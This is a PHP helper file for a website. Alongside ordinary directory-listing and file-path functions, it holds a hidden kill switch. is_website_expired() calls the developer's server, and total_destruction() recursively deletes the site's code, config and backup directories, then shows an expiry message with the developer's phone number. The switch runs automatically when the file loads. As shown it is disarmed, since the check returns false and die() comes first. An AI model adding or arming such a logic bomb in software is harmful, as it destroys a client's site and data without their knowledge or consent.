<?php

function dir_to_array($dir) {
   $result = array();
   $cdir = scandir($dir);
   foreach ($cdir as $key => $value){
      if (!in_array($value,array(".",".."))){
         if (is_dir($dir . DIRECTORY_SEPARATOR . $value)){
            $result[$value] = dir_to_array($dir . DIRECTORY_SEPARATOR . $value);
         }
         else $result[] = $value;
      }
   }
   return $result;
} 


function find_all_files($dir){
   // echo $dir."<br>";
   $root = scandir($dir);
   foreach($root as $value){
      if($value == '.' || $value == '..') {continue;}
      if(is_file("$dir/$value")){
         $result[]= "$dir/$value"; 
         continue;
      }
      foreach(find_all_files("$dir/$value") as $value){
         $result[]= $value;
      }
   }
   return (isset($result)) ? $result : [] ;
}

function get_file_data($file){
      $file = str_replace("\\","/",$file);
      $file = strtolower($file);
      $file_array1 = explode('.',$file);
      $ext = array_pop($file_array1);
      $file_array2 = explode('/',implode('.',$file_array1));
      $file_name = array_pop($file_array2);
      $path = implode('/',$file_array2);
      $res = [
            "ext"=>$ext,
            "file_name"=>$file_name,
            "file_full_name"=>$file_name.".".$ext,
            "file_full_path"=>$path."/".$file_name.".".$ext,
            "path"=>$path,
      ];
      return $res;
}




function delTree($dir) { 
   $files = array_diff(scandir($dir), array('.','..')); 
   foreach ($files as $file) { 
      (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
   } 
   return rmdir($dir); 
} 

function is_website_expired($domain_name){ //just the domain EX: spidro.com (not spidro.com/ar)
   $website_name = "ahmed-badawy.com";
   $json = file_get_contents("http://ahmed-badawy.com/site/website-check/".$website_name);
   $json = json_decode($json,true);
   // dd($json);
   return false;
}
function total_destruction(){
      die('total_destruction');
      delTree('app/Http');
      delTree('resources');
      delTree('public');
      delTree('backups');
      delTree('config');
      $msg = 'this site is expired- <br> Please call the developer: (Ahmed Badawy)  <br> phone: 01111988246';
      try{
         delTree('app/_custom');
      }catch(Exception $e){
         die($msg);
      }
      die($msg);  
}
if (is_website_expired("alaryafest.com")) total_destruction();

